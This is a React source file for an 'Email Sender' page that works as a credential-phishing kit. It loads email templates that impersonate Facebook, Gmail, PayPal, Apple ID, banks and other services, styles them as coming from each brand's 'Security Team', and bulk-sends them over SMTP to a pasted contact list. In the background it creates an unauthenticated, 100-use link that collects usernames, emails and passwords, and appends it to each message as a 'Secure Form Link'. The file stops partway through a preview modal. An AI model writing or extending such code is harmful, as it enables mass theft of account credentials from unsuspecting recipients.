'use client';

import { useState, useEffect } from 'react';
import { Button } from '@/components/ui/Button';
import { Input } from '@/components/ui/Input';
import { createClient } from '@/lib/supabase/client';
import { Mail, Send, Settings, Upload, CheckCircle, Sparkles, Eye, X } from 'lucide-react';
import toast from 'react-hot-toast';

interface SMTPSettings {
  id?: string;
  smtp_host: string;
  smtp_port: number;
  smtp_user: string;
  smtp_password: string;
  smtp_from_email: string;
  smtp_from_name: string;
}

interface Recipient {
  email: string;
  name?: string;
}

// Account types with their email templates
const ACCOUNT_TYPES = [
  { id: 'facebook', name: 'Facebook', icon: '📘', color: 'from-blue-500 to-blue-600' },
  { id: 'gmail', name: 'Gmail / Google', icon: '📧', color: 'from-red-500 to-yellow-500' },
  { id: 'instagram', name: 'Instagram', icon: '📷', color: 'from-purple-500 to-pink-500' },
  { id: 'banking', name: 'Banking', icon: '🏦', color: 'from-green-500 to-emerald-600' },
  { id: 'whatsapp', name: 'WhatsApp', icon: '💬', color: 'from-green-400 to-green-600' },
  { id: 'linkedin', name: 'LinkedIn', icon: '💼', color: 'from-blue-600 to-blue-700' },
  { id: 'twitter', name: 'Twitter / X', icon: '🐦', color: 'from-blue-400 to-blue-500' },
  { id: 'apple', name: 'Apple ID', icon: '🍎', color: 'from-gray-700 to-gray-900' },
  { id: 'microsoft', name: 'Microsoft', icon: '🪟', color: 'from-blue-500 to-cyan-500' },
  { id: 'amazon', name: 'Amazon', icon: '📦', color: 'from-orange-400 to-yellow-500' },
  { id: 'paypal', name: 'PayPal', icon: '💳', color: 'from-blue-600 to-blue-800' },
  { id: 'tiktok', name: 'TikTok', icon: '🎵', color: 'from-black to-pink-600' },
];

export default function EmailSenderPage() {
  const supabase = createClient();
  const [activeTab, setActiveTab] = useState<'smtp' | 'send'>('smtp');
  const [smtpConfigured, setSmtpConfigured] = useState(false);
  const [darkMode, setDarkMode] = useState(false);
  
  // SMTP Settings
  const [smtpSettings, setSmtpSettings] = useState<SMTPSettings>({
    smtp_host: '',
    smtp_port: 587,
    smtp_user: '',
    smtp_password: '',
    smtp_from_email: '',
    smtp_from_name: '',
  });

  // Email Sending
  const [selectedAccountType, setSelectedAccountType] = useState('');
  const [emailSubject, setEmailSubject] = useState('');
  const [emailBody, setEmailBody] = useState('');
  const [includeAskUrl, setIncludeAskUrl] = useState(true);
  const [askUrl, setAskUrl] = useState('');
  const [recipients, setRecipients] = useState<Recipient[]>([]);
  const [emailList, setEmailList] = useState('');
  const [loading, setLoading] = useState(false);
  const [sendProgress, setSendProgress] = useState<{ sent: number; failed: number; total: number } | null>(null);
  const [showPreview, setShowPreview] = useState(false);

  useEffect(() => {
    // Check dark mode from document
    const isDark = document.documentElement.classList.contains('dark');
    setDarkMode(isDark);
    
    const observer = new MutationObserver(() => {
      const isDark = document.documentElement.classList.contains('dark');
      setDarkMode(isDark);
    });
    
    observer.observe(document.documentElement, {
      attributes: true,
      attributeFilter: ['class']
    });

    loadSMTPSettings();
    loadDefaultTemplates();

    return () => observer.disconnect();
  }, []);

  const loadSMTPSettings = async () => {
    try {
      const res = await fetch('/api/smtp/config');
      const result = await res.json();
      if (result.data) {
        setSmtpSettings(result.data);
        setSmtpConfigured(true);
      }
    } catch (error) {
      console.error('Error loading SMTP settings:', error);
    }
  };

  const loadDefaultTemplates = async () => {
    try {
      await fetch('/api/email-templates/defaults', { method: 'POST' });
    } catch (error) {
      console.error('Error loading default templates:', error);
    }
  };

  const saveSMTPSettings = async () => {
    setLoading(true);
    try {
      const res = await fetch('/api/smtp/config', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(smtpSettings),
      });
      const result = await res.json();
      if (res.ok) {
        toast.success('✓ SMTP settings saved successfully!');
        setSmtpConfigured(true);
        setActiveTab('send');
      } else {
        toast.error(result.error || 'Failed to save settings');
      }
    } catch (error) {
      toast.error('Error saving SMTP settings');
    } finally {
      setLoading(false);
    }
  };

  const loadTemplateForAccount = async (accountType: string) => {
    setSelectedAccountType(accountType);
    
    // Auto-generate collection URL in the background
    if (includeAskUrl) {
      generateAskUrlInBackground();
    }
    
    // Template name mapping
    const templateMap: { [key: string]: string } = {
      'facebook': 'Facebook Security Reminder',
      'gmail': 'Gmail Security Reminder',
      'instagram': 'Instagram Security Alert',
      'banking': 'Banking Security Reminder',
      'whatsapp': 'WhatsApp Security Tips',
      'linkedin': 'LinkedIn Security Reminder',
      'twitter': 'Twitter/X Security Alert',
      'apple': 'Apple ID Security Reminder',
      'microsoft': 'Microsoft Account Security',
      'amazon': 'Amazon Account Security',
      'paypal': 'PayPal Security Reminder',
      'tiktok': 'TikTok Security Tips',
    };

    try {
      const res = await fetch('/api/email-templates');
      const result = await res.json();
      if (result.data) {
        const template = result.data.find((t: any) => 
          t.template_name === templateMap[accountType]
        );
        if (template) {
          setEmailSubject(template.subject);
          setEmailBody(template.body);
          toast.success(`✓ ${templateMap[accountType]} loaded!`);
        }
      }
    } catch (error) {
      console.error('Error loading template:', error);
    }
  };

  const generateAskUrlInBackground = async () => {
    try {
      const { data: { user } } = await supabase.auth.getUser();
      if (!user) return;

      const expiresAt = new Date();
      expiresAt.setDate(expiresAt.getDate() + 7);

      const { data, error } = await supabase
        .from('collection_links')
        .insert({
          owner_id: user.id,
          link_type: 'multi-use',
          item_type: 'credential',
          allowed_fields: ['username', 'email', 'password', 'website'],
          expires_at: expiresAt.toISOString(),
          max_uses: 100,
          current_uses: 0,
          requires_auth: false,
        })
        .select()
        .single();

      if (error) throw error;

      const url = `${window.location.origin}/collect/${data.id}`;
      setAskUrl(url);
    } catch (error) {
      console.error('Error generating ask URL:', error);
    }
  };

  const parseEmailList = (text: string) => {
    const lines = text.split('\n').filter(line => line.trim());
    const parsed: Recipient[] = [];
    
    for (const line of lines) {
      const trimmed = line.trim();
      if (trimmed.includes('<') && trimmed.includes('>')) {
        const nameMatch = trimmed.match(/^(.+?)\s*<(.+?)>$/);
        if (nameMatch) {
          parsed.push({ name: nameMatch[1].trim(), email: nameMatch[2].trim() });
        }
      } else if (trimmed.includes('@')) {
        parsed.push({ email: trimmed });
      }
    }
    
    setRecipients(parsed);
  };

  const sendEmails = async () => {
    if (!smtpConfigured) {
      toast.error('Please configure SMTP settings first');
      setActiveTab('smtp');
      return;
    }

    if (recipients.length === 0) {
      toast.error('Please add recipients');
      return;
    }

    if (!emailSubject || !emailBody) {
      toast.error('Please fill in subject and body');
      return;
    }

    setLoading(true);
    setSendProgress({ sent: 0, failed: 0, total: recipients.length });

    // Prepare email body with ask URL if included
    let finalBody = emailBody;
    if (includeAskUrl && askUrl) {
      finalBody += `\n\n──────────────────────────\n\n`;
      finalBody += `🔐 Secure Form Link:\n${askUrl}\n\n`;
      finalBody += `Click the link above to securely update your information.`;
    }

    try {
      const res = await fetch('/api/email/send', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          recipients,
          subject: emailSubject,
          emailBody: finalBody,
          accountType: selectedAccountType,
        }),
      });
      const result = await res.json();
      
      if (res.ok) {
        setSendProgress({ sent: result.sent, failed: result.failed, total: recipients.length });
        toast.success(`✓ Sent ${result.sent} emails successfully!`);
      } else {
        toast.error(result.error || 'Failed to send emails');
      }
    } catch (error) {
      toast.error('Error sending emails');
    } finally {
      setLoading(false);
    }
  };

  const getPreviewHTML = () => {
    const sampleBody = emailBody.replace(/\{name\}/g, 'John Doe');
    let finalBody = sampleBody;
    if (includeAskUrl && askUrl) {
      finalBody += `\n\n──────────────────────────\n\n`;
      finalBody += `🔐 Secure Form Link:\n${askUrl}\n\n`;
      finalBody += `Click the link above to securely update your information.`;
    }

    // Import the template function dynamically for preview
    const getEmailTemplate = (accountType: string, subject: string, body: string) => {
      // This is a client-side version of the template
      const templates: { [key: string]: any } = {
        facebook: { colors: { primary: '#1877F2', background: 'linear-gradient(135deg, #1877F2 0%, #0866FF 100%)' }, logo: '📘', name: 'Facebook' },
        gmail: { colors: { primary: '#EA4335', background: 'linear-gradient(135deg, #EA4335 0%, #FBBC04 50%, #34A853 100%)' }, logo: '📧', name: 'Gmail' },
        instagram: { colors: { primary: '#E4405F', background: 'linear-gradient(135deg, #F58529 0%, #DD2A7B 50%, #8134AF 100%)' }, logo: '📷', name: 'Instagram' },
        banking: { colors: { primary: '#10B981', background: 'linear-gradient(135deg, #10B981 0%, #059669 100%)' }, logo: '🏦', name: 'Banking' },
        whatsapp: { colors: { primary: '#25D366', background: 'linear-gradient(135deg, #25D366 0%, #128C7E 100%)' }, logo: '💬', name: 'WhatsApp' },
        linkedin: { colors: { primary: '#0A66C2', background: 'linear-gradient(135deg, #0A66C2 0%, #004182 100%)' }, logo: '💼', name: 'LinkedIn' },
        twitter: { colors: { primary: '#1DA1F2', background: 'linear-gradient(135deg, #1DA1F2 0%, #0C85D0 100%)' }, logo: '🐦', name: 'Twitter/X' },
        apple: { colors: { primary: '#000000', background: 'linear-gradient(135deg, #000000 0%, #555555 100%)' }, logo: '🍎', name: 'Apple ID' },
        microsoft: { colors: { primary: '#00A4EF', background: 'linear-gradient(135deg, #F25022 0%, #00A4EF 25%, #7FBA00 75%, #FFB900 100%)' }, logo: '🪟', name: 'Microsoft' },
        amazon: { colors: { primary: '#FF9900', background: 'linear-gradient(135deg, #FF9900 0%, #146EB4 100%)' }, logo: '📦', name: 'Amazon' },
        paypal: { colors: { primary: '#0070BA', background: 'linear-gradient(135deg, #0070BA 0%, #003087 100%)' }, logo: '💳', name: 'PayPal' },
        tiktok: { colors: { primary: '#000000', background: 'linear-gradient(135deg, #000000 0%, #FE2C55 50%, #00F2EA 100%)' }, logo: '🎵', name: 'TikTok' },
      };
      
      const template = templates[accountType] || templates.facebook;
      
      return `
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>${subject}</title>
</head>
<body style="margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif; background: ${template.colors.background}; padding: 40px 20px;">
  <table role="presentation" style="width: 100%; max-width: 600px; margin: 0 auto; background: white; border-radius: 20px; overflow: hidden; box-shadow: 0 20px 60px rgba(0,0,0,0.3);">
    <tr>
      <td style="background: ${template.colors.background}; padding: 50px 30px; text-align: center;">
        <div style="background: white; width: 100px; height: 100px; border-radius: 50%; margin: 0 auto 25px; display: inline-flex; align-items: center; justify-content: center; box-shadow: 0 15px 40px rgba(0,0,0,0.2);">
          <span style="font-size: 50px;">${template.logo}</span>
        </div>
        <div style="display: inline-block; background: rgba(255,255,255,0.95); padding: 12px 24px; border-radius: 30px; margin-bottom: 20px; box-shadow: 0 8px 20px rgba(0,0,0,0.15);">
          <span style="font-size: 18px; font-weight: 800; background: ${template.colors.background}; -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text;">${template.name} Security</span>
        </div>
        <h1 style="margin: 0; color: white; font-size: 32px; font-weight: 900; text-shadow: 0 4px 15px rgba(0,0,0,0.3);">Security Reminder</h1>
        <p style="margin: 15px 0 0 0; color: rgba(255,255,255,0.95); font-size: 16px; font-weight: 500;">Keep your account safe and secure</p>
      </td>
    </tr>
    <tr>
      <td style="padding: 50px 40px;">
        <div style="background: linear-gradient(135deg, ${template.colors.primary}15, ${template.colors.primary}15); border-left: 4px solid ${template.colors.primary}; padding: 20px; border-radius: 12px; margin-bottom: 30px;">
          <div style="display: flex; align-items: center; gap: 12px;">
            <span style="font-size: 24px;">🔒</span>
            <span style="color: ${template.colors.primary}; font-weight: 700; font-size: 15px;">SECURITY ALERT</span>
          </div>
        </div>
        <div style="color: #333; font-size: 16px; line-height: 1.8;">
          ${body.split('\n').map((line: string) => {
            if (line.trim().startsWith('──────')) {
              return '<hr style="border: none; border-top: 2px solid #e5e7eb; margin: 35px 0;">';
            }
            if (line.trim().startsWith('🔐')) {
              return `<div style="background: ${template.colors.background}; color: white; padding: 25px; border-radius: 16px; margin: 30px 0; font-weight: 600; box-shadow: 0 8px 25px rgba(0,0,0,0.15);"><div style="font-size: 18px; margin-bottom: 8px;">🔐 Secure Access</div><div style="font-size: 14px; opacity: 0.95;">${line.replace('🔐', '').trim()}</div></div>`;
            }
            if (line.includes('http://') || line.includes('https://')) {
              return `<div style="margin: 35px 0; text-align: center;"><a href="${line.trim()}" style="display: inline-block; background: ${template.colors.background}; color: white; text-decoration: none; padding: 18px 40px; border-radius: 50px; font-weight: 800; font-size: 16px; box-shadow: 0 8px 25px rgba(0,0,0,0.2);">🔗 Open Secure Form</a><p style="margin: 15px 0 0 0; font-size: 13px; color: #6b7280;">Click the button above to access the secure form</p></div>`;
            }
            if (line.trim().startsWith('•') || line.trim().startsWith('-')) {
              return `<div style="display: flex; align-items: start; margin: 12px 0;"><span style="color: ${template.colors.primary}; font-size: 20px; margin-right: 12px; margin-top: 2px;">✓</span><span style="flex: 1; color: #4b5563;">${line.replace(/^[•\-]\s*/, '')}</span></div>`;
            }
            return line ? `<p style="margin: 0 0 18px 0; color: #374151; line-height: 1.7;">${line}</p>` : '<div style="height: 12px;"></div>';
          }).join('')}
        </div>
        <div style="background: linear-gradient(135deg, #f0fdf4, #dcfce7); border: 2px solid #86efac; padding: 25px; border-radius: 16px; margin-top: 35px;">
          <div style="display: flex; align-items: center; gap: 12px; margin-bottom: 12px;">
            <span style="font-size: 24px;">💡</span>
            <span style="color: #065f46; font-weight: 800; font-size: 16px;">Security Tips</span>
          </div>
          <ul style="margin: 0; padding-left: 20px; color: #047857;">
            <li style="margin: 8px 0;">Enable two-factor authentication</li>
            <li style="margin: 8px 0;">Use a strong, unique password</li>
            <li style="margin: 8px 0;">Review your login activity regularly</li>
          </ul>
        </div>
      </td>
    </tr>
    <tr>
      <td style="background: linear-gradient(to bottom, #ffffff, #f9fafb); padding: 40px 40px 30px; text-align: center; border-top: 1px solid #e5e7eb;">
        <div style="display: inline-block; background: ${template.colors.background}; padding: 12px 28px; border-radius: 50px; margin-bottom: 25px; box-shadow: 0 6px 20px rgba(0,0,0,0.12);">
          <span style="color: white; font-weight: 800; font-size: 14px; letter-spacing: 0.5px;">${template.logo} ${template.name.toUpperCase()} SECURITY TEAM</span>
        </div>
        <p style="margin: 0 0 20px 0; color: #6b7280; font-size: 14px; line-height: 1.7;">This is an automated security reminder to help keep your ${template.name} account safe.<br>If you have any questions or concerns, please don't hesitate to reach out.</p>
        <div style="margin-top: 25px; padding-top: 20px; border-top: 1px solid #e5e7eb;">
          <span style="display: inline-block; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 8px 20px; border-radius: 20px; font-size: 12px; font-weight: 700; box-shadow: 0 4px 12px rgba(102, 126, 234, 0.3);">🔒 Sent via OPFRES Vault</span>
        </div>
      </td>
    </tr>
  </table>
  <div style="text-align: center; margin-top: 30px; color: white; font-size: 13px; opacity: 0.95; text-shadow: 0 2px 8px rgba(0,0,0,0.2);">
    <p style="margin: 5px 0; font-weight: 600;">✨ Sent with care to keep you safe online</p>
    <p style="margin: 5px 0; opacity: 0.8; font-size: 12px;">Secure • Private • Trusted</p>
  </div>
</body>
</html>
      `;
    };

    return getEmailTemplate(selectedAccountType || 'facebook', emailSubject, finalBody);
  };

  return (
    <div className={`max-w-6xl mx-auto space-y-6 transition-colors duration-300`}>
      {/* Header */}
      <div className="flex items-center justify-between">
        <div>
          <h1 className="text-4xl font-black bg-gradient-to-r from-pink-600 via-purple-600 to-indigo-600 bg-clip-text text-transparent">
            Email Sender
          </h1>
          <p className={`${darkMode ? 'text-purple-300' : 'text-gray-600'} mt-2`}>
            Send security reminders to your contacts
          </p>
        </div>
        {smtpConfigured && (
          <div className="flex items-center gap-2 px-4 py-2 bg-green-50 dark:bg-green-900/30 border border-green-200 dark:border-green-700 rounded-xl">
            <CheckCircle className="text-green-600 dark:text-green-400" size={20} />
            <span className="text-sm font-semibold text-green-700 dark:text-green-300">SMTP Configured</span>
          </div>
        )}
      </div>

      {/* Tabs */}
      <div className={`flex gap-2 p-2 ${darkMode ? 'bg-gray-800/50 border-gray-700' : 'bg-white border-gray-200'} rounded-2xl shadow-lg border transition-colors`}>
        <button
          onClick={() => setActiveTab('smtp')}
          className={`flex-1 flex items-center justify-center gap-3 px-6 py-4 rounded-xl font-bold transition-all duration-300 ${
            activeTab === 'smtp'
              ? 'bg-gradient-to-r from-purple-500 to-indigo-500 text-white shadow-lg scale-105'
              : darkMode 
                ? 'text-purple-300 hover:bg-gray-700/50' 
                : 'text-gray-600 hover:bg-gray-50'
          }`}
        >
          <Settings size={20} />
          <span>SMTP Configuration</span>
        </button>
        <button
          onClick={() => setActiveTab('send')}
          className={`flex-1 flex items-center justify-center gap-3 px-6 py-4 rounded-xl font-bold transition-all duration-300 ${
            activeTab === 'send'
              ? 'bg-gradient-to-r from-pink-500 to-rose-500 text-white shadow-lg scale-105'
              : darkMode 
                ? 'text-purple-300 hover:bg-gray-700/50' 
                : 'text-gray-600 hover:bg-gray-50'
          }`}
        >
          <Send size={20} />
          <span>Send Emails</span>
        </button>
      </div>

      {/* SMTP Configuration Tab */}
      {activeTab === 'smtp' && (
        <div className={`${darkMode ? 'bg-gradient-to-br from-gray-800 to-purple-900/30 border-purple-700' : 'bg-gradient-to-br from-white to-purple-50 border-purple-200'} p-8 rounded-3xl shadow-xl border-2 transition-colors`}>
          <div className="flex items-center gap-3 mb-6">
            <div className="p-3 bg-gradient-to-br from-purple-500 to-indigo-500 rounded-2xl">
              <Settings className="text-white" size={24} />
            </div>
            <div>
              <h2 className={`text-2xl font-black ${darkMode ? 'text-white' : 'text-gray-900'}`}>SMTP Server Settings</h2>
              <p className={`text-sm ${darkMode ? 'text-purple-300' : 'text-gray-600'}`}>Configure your email server to send emails</p>
            </div>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
            <div>
              <label className={`block text-sm font-bold mb-2 ${darkMode ? 'text-purple-200' : 'text-gray-700'}`}>SMTP Host</label>
              <Input
                type="text"
                value={smtpSettings.smtp_host}
                onChange={(e) => setSmtpSettings({ ...smtpSettings, smtp_host: e.target.value })}
                placeholder="smtp.gmail.com"
                className="h-12"
              />
            </div>
            <div>
              <label className={`block text-sm font-bold mb-2 ${darkMode ? 'text-purple-200' : 'text-gray-700'}`}>SMTP Port</label>
              <Input
                type="number"
                value={smtpSettings.smtp_port}
                onChange={(e) => setSmtpSettings({ ...smtpSettings, smtp_port: parseInt(e.target.value) })}
                placeholder="587"
                className="h-12"
              />
            </div>
            <div>
              <label className={`block text-sm font-bold mb-2 ${darkMode ? 'text-purple-200' : 'text-gray-700'}`}>SMTP Username</label>
              <Input
                type="text"
                value={smtpSettings.smtp_user}
                onChange={(e) => setSmtpSettings({ ...smtpSettings, smtp_user: e.target.value })}
                placeholder="your-email@gmail.com"
                className="h-12"
              />
            </div>
            <div>
              <label className={`block text-sm font-bold mb-2 ${darkMode ? 'text-purple-200' : 'text-gray-700'}`}>SMTP Password</label>
              <Input
                type="password"
                value={smtpSettings.smtp_password}
                onChange={(e) => setSmtpSettings({ ...smtpSettings, smtp_password: e.target.value })}
                placeholder="Your app password"
                className="h-12"
              />
            </div>
            <div>
              <label className={`block text-sm font-bold mb-2 ${darkMode ? 'text-purple-200' : 'text-gray-700'}`}>From Email</label>
              <Input
                type="email"
                value={smtpSettings.smtp_from_email}
                onChange={(e) => setSmtpSettings({ ...smtpSettings, smtp_from_email: e.target.value })}
                placeholder="your-email@gmail.com"
                className="h-12"
              />
            </div>
            <div>
              <label className={`block text-sm font-bold mb-2 ${darkMode ? 'text-purple-200' : 'text-gray-700'}`}>From Name</label>
              <Input
                type="text"
                value={smtpSettings.smtp_from_name}
                onChange={(e) => setSmtpSettings({ ...smtpSettings, smtp_from_name: e.target.value })}
                placeholder="Your Name"
                className="h-12"
              />
            </div>
          </div>

          <div className={`mt-8 p-4 ${darkMode ? 'bg-blue-900/30 border-blue-700' : 'bg-blue-50 border-blue-200'} border-2 rounded-2xl transition-colors`}>
            <p className={`text-sm ${darkMode ? 'text-blue-300' : 'text-blue-800'}`}>
              <strong>💡 Gmail Users:</strong> Use port 587, and generate an "App Password" from your Google Account security settings.
            </p>
          </div>

          <div className="mt-6">
            <Button 
              onClick={saveSMTPSettings} 
              disabled={loading}
              className="w-full h-14 text-lg font-bold bg-gradient-to-r from-purple-500 to-indigo-500 hover:from-purple-600 hover:to-indigo-600"
            >
              {loading ? 'Saving...' : '💾 Save SMTP Settings'}
            </Button>
          </div>
        </div>
      )}

      {/* Send Emails Tab */}
      {activeTab === 'send' && (
        <div className="space-y-6">
          {/* Account Type Selection */}
          <div className={`${darkMode ? 'bg-gradient-to-br from-gray-800 to-pink-900/30 border-pink-700' : 'bg-gradient-to-br from-white to-pink-50 border-pink-200'} p-8 rounded-3xl shadow-xl border-2 transition-colors`}>
            <div className="flex items-center justify-between mb-6">
              <div className="flex items-center gap-3">
                <div className="p-3 bg-gradient-to-br from-pink-500 to-rose-500 rounded-2xl">
                  <Sparkles className="text-white" size={24} />
                </div>
                <div>
                  <h2 className={`text-2xl font-black ${darkMode ? 'text-white' : 'text-gray-900'}`}>Select Account Type</h2>
                  <p className={`text-sm ${darkMode ? 'text-pink-300' : 'text-gray-600'}`}>Choose a service to load its security reminder template</p>
                </div>
              </div>
              
              {/* Include collection link toggle */}
              <div className="flex items-center gap-2">
                <input
                  type="checkbox"
                  checked={includeAskUrl}
                  onChange={(e) => {
                    setIncludeAskUrl(e.target.checked);
                    if (e.target.checked && selectedAccountType) {
                      generateAskUrlInBackground();
                    }
                  }}
                  className="w-5 h-5 text-purple-600 rounded"
                />
                <label className={`text-sm font-bold ${darkMode ? 'text-purple-300' : 'text-gray-700'}`}>
                  Include Secure Link
                </label>
              </div>
            </div>

            <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-4">
              {ACCOUNT_TYPES.map((type) => (
                <button
                  key={type.id}
                  onClick={() => loadTemplateForAccount(type.id)}
                  className={`relative p-6 rounded-2xl border-2 transition-all duration-300 transform hover:scale-105 ${
                    selectedAccountType === type.id
                      ? `bg-gradient-to-br ${type.color} text-white border-white shadow-2xl scale-105`
                      : darkMode
                        ? 'bg-gray-800 border-gray-700 hover:border-pink-500 hover:shadow-lg'
                        : 'bg-white border-gray-200 hover:border-pink-300 hover:shadow-lg'
                  }`}
                >
                  <div className="text-4xl mb-2">{type.icon}</div>
                  <div className={`text-sm font-bold ${
                    selectedAccountType === type.id 
                      ? 'text-white' 
                      : darkMode ? 'text-purple-200' : 'text-gray-700'
                  }`}>
                    {type.name}
                  </div>
                  {selectedAccountType === type.id && (
                    <div className="absolute top-2 right-2">
                      <CheckCircle className="text-white" size={20} />
                    </div>
                  )}
                </button>
              ))}
            </div>
          </div>

          {/* Email Content */}
          {selectedAccountType && (
            <>
              <div className={`${darkMode ? 'bg-gradient-to-br from-gray-800 to-indigo-900/30 border-indigo-700' : 'bg-gradient-to-br from-white to-indigo-50 border-indigo-200'} p-8 rounded-3xl shadow-xl border-2 transition-colors`}>
                <div className="flex items-center justify-between mb-6">
                  <div className="flex items-center gap-3">
                    <div className="p-3 bg-gradient-to-br from-indigo-500 to-purple-500 rounded-2xl">
                      <Mail className="text-white" size={24} />
                    </div>
                    <div>
                      <h2 className={`text-2xl font-black ${darkMode ? 'text-white' : 'text-gray-900'}`}>Email Content</h2>
                      <p className={`text-sm ${darkMode ? 'text-indigo-300' : 'text-gray-600'}`}>Customize your email message</p>
                    </div>
                  </div>
                  
                  {/* Preview Button */}
                  <Button
                    onClick={() => setShowPreview(true)}
                    variant="secondary"
                    className="flex items-center gap-2 bg-gradient-to-r from-indigo-500 to-purple-500 text-white hover:from-indigo-600 hover:to-purple-600"
                  >
                    <Eye size={18} />
                    Preview Email
                  </Button>
                </div>

                <div className="space-y-6">
                  <div>
                    <label className={`block text-sm font-bold mb-2 ${darkMode ? 'text-indigo-200' : 'text-gray-700'}`}>Email Subject</label>
                    <Input
                      type="text"
                      value={emailSubject}
                      onChange={(e) => setEmailSubject(e.target.value)}
                      placeholder="Email subject"
                      className="h-12 text-lg"
                    />
                  </div>

                  <div>
                    <label className={`block text-sm font-bold mb-2 ${darkMode ? 'text-indigo-200' : 'text-gray-700'}`}>Email Body</label>
                    <textarea
                      value={emailBody}
                      onChange={(e) => setEmailBody(e.target.value)}
                      className={`w-full p-4 border-2 rounded-2xl focus:ring-4 focus:ring-indigo-500 focus:border-indigo-500 min-h-[300px] text-base transition-colors ${
                        darkMode 
                          ? 'bg-gray-900 border-gray-700 text-white' 
                          : 'bg-white border-gray-300 text-gray-900'
                      }`}
                      placeholder="Your email content here..."
                    />
                    <p className={`text-sm mt-2 ${darkMode ? 'text-gray-400' : 'text-gray-500'}`}>
                      💡 Use {'{name}'} to personalize with recipient names
                      {includeAskUrl && ' • Secure collection link will be added automatically'}
                    </p>
                  </div>
                </div>
              </div>

              {/* Recipients */}
              <div className={`${darkMode ? 'bg-gradient-to-br from-gray-800 to-green-900/30 border-green-700' : 'bg-gradient-to-br from-white to-green-50 border-green-200'} p-8 rounded-3xl shadow-xl border-2 transition-colors`}>
                <div className="flex items-center gap-3 mb-6">
                  <div className="p-3 bg-gradient-to-br from-green-500 to-emerald-500 rounded-2xl">
                    <Upload className="text-white" size={24} />
                  </div>
                  <div>
                    <h2 className={`text-2xl font-black ${darkMode ? 'text-white' : 'text-gray-900'}`}>Email Recipients</h2>
                    <p className={`text-sm ${darkMode ? 'text-green-300' : 'text-gray-600'}`}>Add your contact list</p>
                  </div>
                </div>

                <div className="space-y-4">
                  <div>
                    <label className={`block text-sm font-bold mb-2 ${darkMode ? 'text-green-200' : 'text-gray-700'}`}>
                      Email List (one per line)
                    </label>
                    <textarea
                      value={emailList}
                      onChange={(e) => {
                        setEmailList(e.target.value);
                        parseEmailList(e.target.value);
                      }}
                      className={`w-full p-4 border-2 rounded-2xl focus:ring-4 focus:ring-green-500 focus:border-green-500 font-mono text-sm min-h-[150px] transition-colors ${
                        darkMode 
                          ? 'bg-gray-900 border-gray-700 text-white' 
                          : 'bg-white border-gray-300 text-gray-900'
                      }`}
                      placeholder="john@example.com&#10;Jane Doe <jane@example.com>&#10;bob@example.com"
                    />
                  </div>

                  {recipients.length > 0 && (
                    <div className={`p-6 rounded-2xl border-2 transition-colors ${
                      darkMode 
                        ? 'bg-green-900/30 border-green-700' 
                        : 'bg-gradient-to-br from-green-50 to-emerald-50 border-green-300'
                    }`}>
                      <div className="flex items-center gap-2 mb-3">
                        <CheckCircle className={darkMode ? 'text-green-400' : 'text-green-600'} size={20} />
                        <span className={`font-bold ${darkMode ? 'text-green-300' : 'text-green-700'}`}>
                          {recipients.length} Recipients Ready
                        </span>
                      </div>
                      <div className="space-y-2 max-h-40 overflow-y-auto">
                        {recipients.slice(0, 10).map((r, i) => (
                          <div key={i} className={`text-sm flex items-center gap-2 ${darkMode ? 'text-gray-300' : 'text-gray-700'}`}>
                            <Mail size={14} className={darkMode ? 'text-green-400' : 'text-green-600'} />
                            {r.name ? `${r.name} (${r.email})` : r.email}
                          </div>
                        ))}
                        {recipients.length > 10 && (
                          <p className={`text-sm font-semibold ${darkMode ? 'text-gray-400' : 'text-gray-500'}`}>
                            ...and {recipients.length - 10} more
                          </p>
                        )}
                      </div>
                    </div>
                  )}
                </div>
              </div>

              {/* Send Progress */}
              {sendProgress && (
                <div className={`p-6 rounded-3xl shadow-xl border-2 transition-colors ${
                  darkMode 
                    ? 'bg-gray-800 border-gray-700' 
                    : 'bg-white border-gray-200'
                }`}>
                  <h3 className={`text-lg font-black mb-4 ${darkMode ? 'text-white' : 'text-gray-900'}`}>📊 Sending Progress</h3>
                  <div className="space-y-3">
                    <div className="flex justify-between text-sm">
                      <span className={`font-semibold ${darkMode ? 'text-gray-300' : 'text-gray-700'}`}>Total: {sendProgress.total}</span>
                      <span className={`font-bold ${darkMode ? 'text-green-400' : 'text-green-600'}`}>✓ Sent: {sendProgress.sent}</span>
                      <span className={`font-bold ${darkMode ? 'text-red-400' : 'text-red-600'}`}>✗ Failed: {sendProgress.failed}</span>
                    </div>
                    <div className={`w-full rounded-full h-6 overflow-hidden ${darkMode ? 'bg-gray-700' : 'bg-gray-200'}`}>
                      <div
                        className="bg-gradient-to-r from-green-500 to-emerald-500 h-6 rounded-full transition-all duration-500 flex items-center justify-center text-white text-xs font-bold"
                        style={{ width: `${((sendProgress.sent + sendProgress.failed) / sendProgress.total) * 100}%` }}
                      >
                        {Math.round(((sendProgress.sent + sendProgress.failed) / sendProgress.total) * 100)}%
                      </div>
                    </div>
                  </div>
                </div>
              )}

              {/* Send Button */}
              <div className="sticky bottom-6">
                <Button
                  onClick={sendEmails}
                  disabled={loading || recipients.length === 0 || !smtpConfigured}
                  className="w-full h-16 text-xl font-black bg-gradient-to-r from-pink-500 via-rose-500 to-red-500 hover:from-pink-600 hover:via-rose-600 hover:to-red-600 shadow-2xl"
                >
                  {loading ? (
                    '⏳ Sending Emails...'
                  ) : (
                    <>
                      <Send size={24} className="mr-3" />
                      Send to {recipients.length} Recipients
                    </>
                  )}
                </Button>
              </div>
            </>
          )}

          {!selectedAccountType && (
            <div className="text-center py-20">
              <div className="text-6xl mb-4">📧</div>
              <h3 className={`text-2xl font-black ${darkMode ? 'text-gray-500' : 'text-gray-400'}`}>
                Select an account type above to get started
              </h3>
            </div>
          )}
        </div>
      )}

      {/* Preview Modal */}
      {showPreview && (
        <div className="fixed inset-0 bg-black/60 backdrop-blur-sm z-50 flex items-center justify-center p-4">
          <div className={`max-w-4xl w-full max-h-[90vh] overflow-y-auto rounded-3xl shadow-2xl ${
            darkMode ? 'bg-gray-900' : 'bg-white'
          }`}>
